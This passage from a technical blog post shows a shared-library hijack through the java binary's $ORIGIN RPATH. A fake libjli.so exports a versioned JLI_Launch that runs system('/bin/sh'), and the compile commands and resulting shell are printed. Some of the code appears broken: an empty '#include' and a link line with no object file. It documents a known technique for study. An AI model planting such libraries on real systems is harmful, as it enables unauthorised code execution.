ELF binary has the following RPATH:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Library rpath: [$ORIGIN/../lib/amd64/jli:$ORIGIN/../lib/amd64]
</span></span></code></pre></div><p>Using <code>ldd</code> comes up that java searches this paths looking for the shared
object (for which I dunno really the purpose yet):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>libjli.so =&gt; /home/$USER/jdk1.8.0_65/jre/bin/../lib/amd64/jli/libjli.so
</span></span></code></pre></div><p>So my attempt to mess with the $ORIGIN var was to create on the same level
of the jdk directory a directory called <code>./bin</code> containing an hard-link or even
a copy of the java binary, and a directory tree on the same level of <code>bin</code>,
which had the following path:
<code>./lib/amd64/jli</code>.</p>
<p>Trying to run the java binary from the new <code>./bin/</code> path happened exactly what I wanted to
see:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./bin/java: error <span style="color:#66d9ef">while</span> loading shared libraries: libjli.so: cannot open shared
</span></span><span style="display:flex;"><span>object file: No such file or directory<span style="color:#e6db74">`</span>
</span></span></code></pre></div><p>So ok, let&rsquo;s build a shared object called that name into <code>lib/amd64/jli</code>
and see what happens&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cat libjli.c </span>
</span></span><span style="display:flex;"><span>int foobar<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> 0x29a;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o libjli.so -shared -fPIC libjli.c
</span></span></code></pre></div><p>And now we try to run again the java binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./bin/java: /tmp/spike/java/bin/../lib/amd64/jli/libjli.so: no version
</span></span><span style="display:flex;"><span>information available <span style="color:#f92672">(</span>required by ./bin/java<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>./bin/java: relocation error: ./bin/java: symbol JLI_Launch, version
</span></span><span style="display:flex;"><span>SUNWprivate_1.1 not defined in file libjli.so with link time reference
</span></span></code></pre></div><p>Good, looking at the main function of the java binary we find a call
to the <code>JLI_Launch</code> function:
<code>0x0000000000400691 &lt;+113&gt;:	call   0x400520 &lt;JLI_Launch@plt&gt;</code></p>
<p>So we redefine our fake <code>libjli.so</code> adding the <code>JLI_Launch</code> function
and also we export the required versioning info.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cat libjli.c </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void JLI_Launch<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>And now a simple version script for the linker:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#cat libjli.map</span>
</span></span><span style="display:flex;"><span>SUNWprivate_1.1 <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	global:
</span></span><span style="display:flex;"><span>		JLI_Launch;		
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>;
</span></span></code></pre></div><p>Finally we recompile the shared object applying the linker script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -c libjli.c -fPIC
</span></span><span style="display:flex;"><span>gcc -o libjli.so -shared -Wl,--version-script<span style="color:#f92672">=</span>libjli.map
</span></span></code></pre></div><p>Now trying to execute the java binary from the ./bin/ path:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>spike@zombie java<span style="color:#f92672">]</span>$ ./bin/java
</span></span><span style="display:flex;"><span>sh-4.3$
</span></span></code></pre></div><p>That&rsquo;s all folks!</p>
<p>[0] <a href="https://backtrace.io/blog/blog/2016/06/29/exploiting-elf-expansion-variables/">https://backtrace.io/blog/blog/2016/06/29/exploiting-elf-expansion-variables/</a></p>
]]></content>
        </item>
        
    </channel>
</rss>
